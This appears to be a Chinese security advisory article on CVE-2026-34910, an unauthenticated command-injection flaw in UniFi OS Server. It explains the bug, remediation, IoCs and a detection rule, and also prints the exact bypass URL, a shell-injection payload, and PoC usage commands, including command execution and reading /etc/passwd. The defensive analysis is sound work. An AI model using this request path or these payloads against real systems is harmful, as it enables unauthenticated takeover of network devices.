---
title: UniFi OS Server 一个 HTTP 请求直接 root，CVSS 满分 10.0
url: https://mp.weixin.qq.com/s/Bg3_2iSALIYYQ8Ai4YTI6g
source: Doonsec's feed
date: 2026-10-01
fetch_date: 2026-10-02T07:48:07.506762
---

# UniFi OS Server 一个 HTTP 请求直接 root，CVSS 满分 10.0

# UniFi OS Server 一个 HTTP 请求直接 root，CVSS 满分 10.0

原创

播风者
播风者

黑白之道

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nGzNudUIJ6NjQiaeR9icrQdRdOcDAY0icibcytkRI7M3zffus18xMwb2T726BiaK22nv3nkopwtULXxvzOlrUsz8KaWcwU8xFlYLXZKMxDRTjxdU/640?from=appmsg)
> **导语**：Ubiquiti 于 2026 年 5 月发布安全公告 SAB-064，披露 UniFi OS Server 中三个独立 CVSS 10.0 漏洞。其中 CVE-2026-34910 利用 Nginx 认证网关与后端路由之间的 URI 解析差异，可在无需任何凭证的情况下执行任意命令。CISA KEV 已收录，野外部署已出现 Mirai 僵尸网络身影。

---

## 一、漏洞速览

| 项目 | 详情 |
| --- | --- |
| **CVE 编号** | CVE-2026-34910 |
| **CVSS 3.1** | 10.0 Critical（AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H） |
| **关联漏洞** | CVE-2026-34909（路径穿越/任意文件读取）、CVE-2026-34908（认证绕过） |
| **漏洞类型** | 认证绕过 + 命令注入 |
| **影响产品** | UniFi OS Server（< 5.0.8 / SAB-064 之前版本） |
| **利用条件** | 无需认证，无需用户交互 |
| **已公开 PoC** | 是（GitHub），已发现野外利用 |

**风险评级**：🔴 极高（满分漏洞，互联网暴露面设备需立即处置）

---

## 二、原理分析

### 2.1 核心成因：Nginx 与后端的 URI 解析不一致

![攻击流程图](https://mmbiz.qpic.cn/sz_mmbiz_png/nGzNudUIJ6P2TqjCqHr5RrXmyftYIg49hicAAVwfCchbD1drHQMDvuBaTDTXWKhXxNHibA3fnbKydCibQ5owTjiacu5icTe56moJYKqY3nHia1MEQ/640?from=appmsg "攻击流程图")

UniFi OS Server 前端由 Nginx 作为认证网关。Nginx 对外暴露的路由策略根据**原始（Raw）URI** 判断该请求是否属于公开白名单路径——以 `/api/auth/validate-sso/` 开头的路径被标记为无需认证。

但 Nginx 在将请求转发给后端 Java 应用时，使用的是**解码后并规范化（Normalized）的 URI**。将 `%2f` 解码为 `/` 后，`..%2f` 会被解析为 `../`，Nginx 随即进行路径穿越合并。

攻击者利用这一差异，构造如下路径：

```
/api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package?pkg_name=<CMD>&by_cmd=true
```

![URI解析差异对比图](https://mmbiz.qpic.cn/mmbiz_png/nGzNudUIJ6MVwEhqNiaibpQd2qY3RgSXQjXia6tVY7rb1uRZGQO1FChicgcI7vfuTu1OKJJVGeuasKTcl0ApWdsg4G0XO2qpOP3s864XZyib5eA4/640?from=appmsg "URI解析差异对比图")

* **Raw URI** 以 `/api/auth/validate-sso/` 开头 → Nginx 判定为公开路径，放行
* **Normalized URI** 经过解码和穿越合并后，实际指向内部 `/proxy/users/api/v2/ucs/update/latest_package`（需要认证的后端接口）

### 2.2 命令注入点

到达后，`pkg_name` 参数被直接拼接入一条 shell 命令：

```
sudo systemctl stop <pkg_name>
```

通过在 `pkg_name` 中注入分号或命令替换符，可使 shell 执行任意攻击者指定的命令：

```
pkg_name=x;id>/tmp/pwned.txt;by_cmd=true
```

实际执行：

```
sudo systemctl stop x;id>/tmp/pwned.txt
```

注入命令以 `ucs-update` 用户身份运行。

### 2.3 攻击链路总结

```
1. 攻击者发送特制 HTTP 请求（Raw URI 通过 Nginx 白名单，Normalized URI 路由至内部接口）
2. Nginx 认证网关放行（以 Raw URI 为准）
3. 后端接收解码后 URI，调用 package-update 处理器
4. pkg_name 参数注入 shell 元字符，命令在 ucs-update 上下文中执行
5. 无需任何凭证，无需用户交互，单请求 RCE
```

---

## 三、影响范围

**受影响版本**（SAB-064 之前）：

* UniFi OS Server < 5.0.8

其他关联受影响产品（含本次漏洞链中的部分环节）：

* UDM、UDM-Pro、UDM-SE、UDM-Pro-Max（< 5.1.12）
* UNVR、UNVR-Pro（< 5.1.12）
* UCG-Ultra、UCG-Max、UCG-Fiber（< 5.1.12）
* UniFi OS Server（< 5.0.8）

> 凡通过端口 8443 或 443 暴露在互联网上的 UniFi 设备，均视为已遭探测目标。

---

## 四、处置方案

### 4.1 首选：升级修复

Ubiquiti 已发布 SAB-064 安全公告，对应补丁版本：

* **UniFi OS Server → 升级至 5.0.8 或更高版本**
* 其他 UniFi 产品线 → 对应版本参考 官方安全公告

⚠️ **补丁风险提示**：UniFi OS 大版本升级可能引发控制器配置重置，建议在非生产时段操作，并提前备份配置。

### 4.2 临时缓解措施

若无法立即升级，建议采取以下措施：

**网络层封堵（首选）**：在边界防火墙或 NAT 设备上，禁止外部对 UniFi 设备 8443/443 端口的直接访问，仅允许通过 VPN 或公司内网访问。

**WAF 规则**：针对以下 URI 特征请求进行拦截或记录：

* 包含 `..%2f` 或 `..%5f` 的 `/api/auth/validate-sso/` 路径
* 包含 `by_cmd=true` 参数的 `/proxy/users/api/v2/ucs/update/` 路径
* `pkg_name` 参数中含 `;`、`$()`、`|` 等 shell 元字符

**排查失陷指标（IOC）**：截至发文，已知的 Mirai 相关 IoC 包括：

* 下发服务器 IP：**185.228.26.16**（建议网络层直接封禁）
* 下载文件名：`zok`（Shell 加载器）、`unifi.exploit`（感染标记参数）
* 植入物家族：azsxd v2.0（Mirai/Gafgyt 衍生变种）

---

## 五、PoC 下载

安全研究 Boreas37 已发布完整 PoC 脚本，支持漏洞探测、命令执行、文件读取三种模式：

> **GitHub**：https://github.com/Boreas37/CVE-2026-34910-PoC

```
# 1. 探测目标是否受影响（无破坏性）
python3 CVE-2026-34910.py https://TARGET:8443 --check

# 2. RCE — 在目标执行任意命令
python3 CVE-2026-34910.py https://TARGET:8443 "id > /tmp/pwned.txt"

# 3. RCE 验证 — 在目标创建文件（推荐）
python3 CVE-2026-34910.py https://TARGET:8443 --proof

# 4. 任意文件读取（CVE-2026-34909）
python3 CVE-2026-34910.py https://TARGET:8443 --read /etc/passwd
```

PwnDefend 提供了详细的野外攻击分析报告，含完整流量样本与检测规则。

---

## 六、检测规则

### 网络层检测（Suricata / Snort 规则示例）

```
alert http any any -> any any (msg:"UniFi CVE-2026-34910 Auth Bypass + Cmd Injection Attempt"; \
  flow:established,to_server; \
  http.uri.raw; content:"/api/auth/validate-sso/..%2f"; \
  http.uri; content:"/proxy/users/api/v2/ucs/update/latest_package"; \
  classtype:web-application-attack; sid:90034910; rev:1;)
```

### YARA 规则（azsxd 植入物检测）

安全公司 BishopFox 提供 CVE-2026-34908 检测工具：https://github.com/BishopFox/CVE-2026-34908-check

---

## 七、参考资料

* Ubiquiti SAB-064 安全公告：https://community.ui.com/releases/Security-Advisory-Bulletin-064-064/84811c09-4cf4-42ab-bd61-cc994445963b
* NVD CVE-2026-34910：https://nvd.nist.gov/vuln/detail/CVE-2026-34910
* NVD CVE-2026-34909：https://nvd.nist.gov/vuln/detail/CVE-2026-34909
* PoC 下载：https://github.com/Boreas37/CVE-2026-34910-PoC
* PwnDefend 野外攻击分析：https://www.pwndefend.com/2026/06/09/cve-2026-34910-exploitation-itw-building-a-botnet-mirai/
* CISA KEV：https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**版权声明**：本文由华盟网原创发布，保留所有权利。配图由华盟网授权使用。

---

![](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6PgOu6D4ThYIsHwrCFzfiaoup9G99ia2ZckfZXZ5bg3wwxrC8gPI5LribFaJfdIhbJAXgOr8vicwXgJLDy92ibGoM4hHaVlicIp5cOQE/640?from=appmsg)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6OddrIeNXI0xnia6FyJSmAzXtFm1a5WHeiaRlKAGMAMlZESNuibFsJW1VQo5AF8gIJj806Yq4D0ibkrkJibjEUAXO786q1rjGmCahdg/640?from=appmsg)](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621549&idx=1&sn=21c4b072726d2387d562109ada6b9bbb&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nGzNudUIJ6PqadHACm18uu52dYYaOSzv99zdcDhZVbJY8j8WpUh2kXMKia4op41Emvf5jkvUeEhGgcBWKGicaSgPbBoxanHm6Yonfl8ugVOdY/640?from=appmsg)](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621944&idx=1&sn=3cc6dc9876a20466d4ec3634deb80220&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6M8Eh9YBd6iavkYMzEtPLYceoOjj9LiaozStMQ63sATatjJkdBiazvbunQtDia3GWORc0Na8icBZCPo9uN2lfYicCUUx09O61ct8cUcQ/640?from=appmsg)](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650622065&idx=1&sn=09f8ae84c06d4331e71c277b177ae701&scene=21#wechat_redirect)

> 👇 点击**阅读原文**，访问我的网站

---

预览时标签不可点

阅读原文

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLicpdp8GZxicJpcFIZglvakzYRZiaqt6W61hfgibjeymOgiaGqRsgNvgWIacMj7Gk4PIZ4o2NtW1zb9P6Q/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过